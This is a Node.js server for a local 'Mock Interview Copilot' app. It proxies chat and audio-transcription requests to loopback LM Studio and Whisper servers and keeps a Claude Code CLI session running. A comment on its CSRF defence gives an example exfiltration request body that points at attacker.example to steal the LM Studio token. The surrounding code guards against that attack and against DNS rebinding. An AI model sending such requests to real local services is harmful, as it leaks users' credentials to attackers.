// Single-command server for Mock Interview Copilot.
// Run: node server.js
//
// Serves the page, hands the page's own JS a set of initial config values
// read from a gitignored .env file (still fully editable in the UI — this
// only sets what shows up on load), and bridges the "Claude Code
// (VS Code subscription)" provider to one persistent CLI session kept
// alive for the life of this server process.

const http = require('http');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const { spawn } = require('child_process');

function loadEnv(file) {
  const env = {};
  if (!fs.existsSync(file)) return env;
  for (const line of fs.readFileSync(file, 'utf8').split('\n')) {
    const trimmed = line.trim();
    if (!trimmed || trimmed.startsWith('#')) continue;
    const eq = trimmed.indexOf('=');
    if (eq === -1) continue;
    const key = trimmed.slice(0, eq).trim();
    let val = trimmed.slice(eq + 1).trim();
    if ((val.startsWith('"') && val.endsWith('"')) || (val.startsWith("'") && val.endsWith("'"))) {
      val = val.slice(1, -1);
    }
    env[key] = val;
  }
  return env;
}

const env = loadEnv(path.join(__dirname, '.env'));
const PORT = Number(env.PORT || 8080);
const BRIDGE_TOKEN = env.BRIDGE_TOKEN || crypto.randomBytes(24).toString('hex');

// Sent to the page on load to prefill the settings bar. Nothing here is
// enforced — every field stays editable from the UI.
const config = {
  claudeApiKey: env.CLAUDE_API_KEY || '',
  lmStudioUrl: env.LMSTUDIO_URL || 'http://localhost:1234/v1/chat/completions',
  lmStudioModel: env.LMSTUDIO_MODEL || 'qwen/qwen3.8-27b',
  lmStudioToken: env.LMSTUDIO_TOKEN || '',
  bridgeToken: BRIDGE_TOKEN
};

// Whisper-compatible transcription server (e.g. faster-whisper-server),
// for the "capture call audio" feature. Not required for anything else.
const whisperConfig = {
  url: env.WHISPER_URL || 'http://localhost:8000/v1/audio/transcriptions',
  model: env.WHISPER_MODEL || 'whisper-1',
  token: env.WHISPER_TOKEN || ''
};

// ---- Persistent Claude Code CLI session ----
//
// `claude -p` normally runs once and exits per prompt. To keep one process
// alive for the whole practice session instead of spawning a CLI per
// question, this uses Claude Code's headless streaming protocol
// (--input-format stream-json / --output-format stream-json): the process
// stays resident, reads one NDJSON "user" turn per line on stdin, and
// emits NDJSON events on stdout, ending each turn with a "result" event.
//
// NOTE: this talks to the CLI's documented streaming JSON protocol, but
// could not be exercised against a live `claude` binary while building
// this (not on PATH in the dev sandbox). Test it once — if your installed
// CLI version's event shape differs, the fix is local to _onStdout below.
class ClaudeCodeSession {
  constructor() {
    this.proc = null;
    this.buffer = '';
    this.waiters = [];
    this.queue = Promise.resolve();
  }

  ensureStarted() {
    if (this.proc) return;
    this.proc = spawn(
      'claude',
      ['-p', '--input-format', 'stream-json', '--output-format', 'stream-json', '--verbose'],
      { shell: process.platform === 'win32' }
    );
    this.buffer = '';
    this.lastErr = '';
    this.proc.stdout.on('data', (d) => this._onStdout(d));
    this.proc.stderr.on('data', (d) => { this.lastErr = d.toString(); });
    this.proc.on('error', (e) => { this.lastErr = e.message; });
    this.proc.on('exit', () => {
      this.proc = null;
      const err = new Error('Claude Code process exited' + (this.lastErr ? `: ${this.lastErr}` : ''));
      while (this.waiters.length) this.waiters.shift().reject(err);
    });
  }

  _onStdout(chunk) {
    this.buffer += chunk.toString();
    let idx;
    while ((idx = this.buffer.indexOf('\n')) >= 0) {
      const line = this.buffer.slice(0, idx).trim();
      this.buffer = this.buffer.slice(idx + 1);
      if (!line) continue;
      let evt;
      try { evt = JSON.parse(line); } catch { continue; }
      if (evt.type === 'result') {
        const waiter = this.waiters.shift();
        if (!waiter) continue;
        if (evt.subtype === 'success') waiter.resolve(evt.result || '');
        else waiter.reject(new Error(evt.result || evt.subtype || 'Claude Code returned an error'));
      }
    }
  }

  ask(prompt) {
    // Requests are serialized: one CLI process, one conversation, one
    // turn at a time.
    this.queue = this.queue.then(() => this._ask(prompt), () => this._ask(prompt));
    return this.queue;
  }

  _ask(prompt) {
    this.ensureStarted();
    return new Promise((resolve, reject) => {
      this.waiters.push({ resolve, reject });
      const line = JSON.stringify({ type: 'user', message: { role: 'user', content: prompt } }) + '\n';
      this.proc.stdin.write(line);
    });
  }

  stop() {
    if (this.proc) {
      try { this.proc.stdin.end(); } catch {}
      this.proc.kill();
      this.proc = null;
    }
  }
}

const session = new ClaudeCodeSession();

const HTML_FILE = path.join(__dirname, 'mock-interview-copilot.html');

// Config (including secrets like API keys) is injected straight into the
// HTML response for '/' rather than served from its own GET endpoint —
// an unauthenticated /api/config would hand those secrets to any page
// that can reach this port, including via DNS rebinding (a remote page
// whose JS resolves an attacker-controlled hostname to 127.0.0.1).
function renderHtmlWithConfig() {
  const raw = fs.readFileSync(HTML_FILE, 'utf8');
  const configScript = `<script>window.__MIC_CONFIG__ = ${JSON.stringify(config)};</script>\n`;
  const idx = raw.indexOf('<script>');
  if (idx === -1) return raw;
  return raw.slice(0, idx) + configScript + raw.slice(idx);
}

// DNS rebinding defense: a rebinding attack makes an attacker's own page
// issue a request whose Host header still names the attacker's domain
// even though the DNS resolution points at 127.0.0.1. Reject anything
// whose Host isn't literally this local server.
function hostIsLocal(req) {
  const host = (req.headers.host || '').toLowerCase();
  return host === `localhost:${PORT}` || host === `127.0.0.1:${PORT}`;
}

// Both /api/chat/* routes require this token in Authorization. Host-header
// checking alone does NOT stop cross-site requests: a page on any other
// origin can still POST to http://localhost:PORT/... (that's what CSRF is),
// and a `Content-Type: text/plain` body is a CORS "simple request" that
// browsers send with no preflight at all, even cross-origin. Without this
// check, a malicious page open in the same browser could POST a body like
// {"url":"https://attacker.example/collect"} with no token, and the server
// would fill in the real LM Studio token from .env and hand it to that URL.
function requireBridgeToken(req, res) {
  const auth = req.headers['authorization'] || '';
  if (auth === `Bearer ${BRIDGE_TOKEN}`) return true;
  res.statusCode = 401;
  res.setHeader('Content-Type', 'application/json');
  res.end(JSON.stringify({ error: 'Missing or wrong bridge token.' }));
  return false;
}

// LM Studio only ever runs on this machine, so the proxy target should
// never leave loopback — this is what stops the endpoint being used as an
// open SSRF relay even from an authenticated request (e.g. a bad paste,
// or the page itself being compromised).
// A proxied server (LM Studio, the whisper server) is expected to answer
// in JSON, but a crashed or misconfigured one can just as easily send an
// HTML error page instead. response.json() on that throws a cryptic
// "Unexpected token '<'" with no indication of what actually failed —
// read the raw text first so a non-JSON response reports what it was.
async function readJsonResponse(response, label) {
  const text = await response.text();
  try {
    return JSON.parse(text);
  } catch {
    throw new Error(`${label} sent back something other than JSON (status ${response.status}): ${text.slice(0, 200)}`);
  }
}

function isLoopbackUrl(str) {
  try {
    const u = new URL(str);
    return u.hostname === 'localhost' || u.hostname === '127.0.0.1' || u.hostname === '::1';
  } catch {
    return false;
  }
}

const server = http.createServer((req, res) => {
  if (!hostIsLocal(req)) {
    res.statusCode = 403;
    res.end('Forbidden');
    return;
  }

  if (req.method === 'GET' && (req.url === '/' || req.url === '/mock-interview-copilot.html')) {
    let html;
    try { html = renderHtmlWithConfig(); }
    catch (e) { res.statusCode = 500; res.end('Could not load page'); return; }
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.end(html);
    return;
  }

  if (req.method === 'POST' && req.url === '/api/chat/local') {
    // Proxied server-side because LM Studio's auth token requirement also
    // applies to CORS preflight requests: it answers OPTIONS with 401
    // instead of a clean 204, so a browser sending a custom Authorization
    // header can never get past preflight to reach LM Studio directly.
    // Node's fetch isn't subject to CORS, so the token-bearing request
    // happens here instead.
    if (!requireBridgeToken(req, res)) return;
    let body = '';
    req.on('data', (c) => { body += c; });
    req.on('end', async () => {
      try {
        const { url, model, token, prompt } = JSON.parse(body);
        const targetUrl = url || config.lmStudioUrl;
        if (!isLoopbackUrl(targetUrl)) throw new Error('LM Studio URL must point at localhost/127.0.0.1.');
        const authToken = token || config.lmStudioToken;
        const headers = { 'Content-Type': 'application/json' };
        if (authToken) headers['Authorization'] = `Bearer ${authToken}`;
        let lmResponse;
        try {
          lmResponse = await fetch(targetUrl, {
            method: 'POST',
            headers,
            body: JSON.stringify({
              model: model || config.lmStudioModel,
              messages: [{ role: 'user', content: prompt }],
              // Reasoning models (e.g. Qwen3) spend a chunk of this budget
              // on a separate reasoning_content field before writing the
              // actual answer — too low a limit and finish_reason:"length"
              // hits before any real content comes out. "Solve" answers in
              // particular can run long, so this stays generous.
              max_tokens: 6000,
              temperature: 0.4,
              // Disables the reasoning phase on models that support it
              // (confirmed live: 0 reasoning tokens, ~2x faster, same
              // answer quality — reasoning was ~70% of tokens generated
              // and most of the wall-clock time for zero user-visible
              // benefit, since it's never shown anyway). Models that
              // don't support this field just ignore it.
              reasoning_effort: 'none'
            })
          });
        } catch (networkErr) {
          throw new Error(`Can't reach LM Studio at ${targetUrl}. Is it running?`);
        }
        const data = await readJsonResponse(lmResponse, 'LM Studio');
        if (!lmResponse.ok) throw new Error(data?.error?.message || `LM Studio error: ${lmResponse.status}`);
        // Only ever hand the page the final content — a reasoning model's
        // chain-of-thought (message.reasoning_content) stays server-side
        // and is never sent to the browser, even as a fallback.
        const content = data?.choices?.[0]?.message?.content;
        const finishReason = data?.choices?.[0]?.finish_reason;
        const responseText = content
          || (finishReason === 'length'
            ? '(Model ran out of response budget before writing an answer. Try a shorter prompt, or ask again.)'
            : '(no response text returned)');
        res.setHeader('Content-Type', 'application/json');
        res.end(JSON.stringify({ content: responseText }));
      } catch (e) {
        res.statusCode = 500;
        res.setHeader('Content-Type', 'application/json');
        res.end(JSON.stringify({ error: e.message }));
      }
    });
    return;
  }

  if (req.method === 'POST' && req.url === '/api/transcribe') {
    // Proxied for the same reasons as /api/chat/local: keeps the request
    // same-origin (avoids CORS entirely) and keeps any whisper-server auth
    // token server-side instead of in a browser fetch.
    if (!requireBridgeToken(req, res)) return;
    const chunks = [];
    req.on('data', (c) => chunks.push(c));
    req.on('end', async () => {
      try {
        const audioBuffer = Buffer.concat(chunks);
        if (audioBuffer.length === 0) throw new Error('Empty audio chunk.');
        if (!isLoopbackUrl(whisperConfig.url)) throw new Error('WHISPER_URL must point at localhost/127.0.0.1.');
        const contentType = req.headers['content-type'] || 'audio/webm';
        const form = new FormData();
        form.append('file', new Blob([audioBuffer], { type: contentType }), 'audio.webm');
        form.append('model', whisperConfig.model);
        const headers = {};
        if (whisperConfig.token) headers['Authorization'] = `Bearer ${whisperConfig.token}`;
        let whisperResponse;
        try {
          whisperResponse = await fetch(whisperConfig.url, { method: 'POST', headers, body: form });
        } catch (networkErr) {
          throw new Error(`Can't reach the transcription server at ${whisperConfig.url}. Is it running? (see README: WHISPER_URL)`);
        }
        const data = await readJsonResponse(whisperResponse, 'The transcription server');
        if (!whisperResponse.ok) throw new Error(data?.error?.message || data?.error || `Transcription server error: ${whisperResponse.status}`);
        res.setHeader('Content-Type', 'application/json');
        res.end(JSON.stringify({ text: data.text || '' }));
      } catch (e) {
        res.statusCode = 500;
        res.setHeader('Content-Type', 'application/json');
        res.end(JSON.stringify({ error: e.message }));
      }
    });
    return;
  }

  if (req.method === 'POST' && req.url === '/api/chat/codebridge') {
    if (!requireBridgeToken(req, res)) return;
    let body = '';
    req.on('data', (c) => { body += c; });
    req.on('end', async () => {
      try {
        const { prompt } = JSON.parse(body);
        const content = await session.ask(prompt);
        res.setHeader('Content-Type', 'application/json');
        res.end(JSON.stringify({ content }));
      } catch (e) {
        res.statusCode = 500;
        res.setHeader('Content-Type', 'application/json');
        res.end(JSON.stringify({ error: e.message }));
      }
    });
    return;
  }

  res.statusCode = 404;
  res.end('Not found');
});

// 127.0.0.1 only: the codebridge route runs Claude Code CLI turns, so it
// must never be reachable from the LAN, only from this machine.
server.listen(PORT, '127.0.0.1', () => {
  console.log(`Mock Interview Copilot running at http://localhost:${PORT}`);
});

function shutdown() {
  session.stop();
  server.close(() => process.exit(0));
}
process.on('SIGINT', shutdown);
process.on('SIGTERM', shutdown);
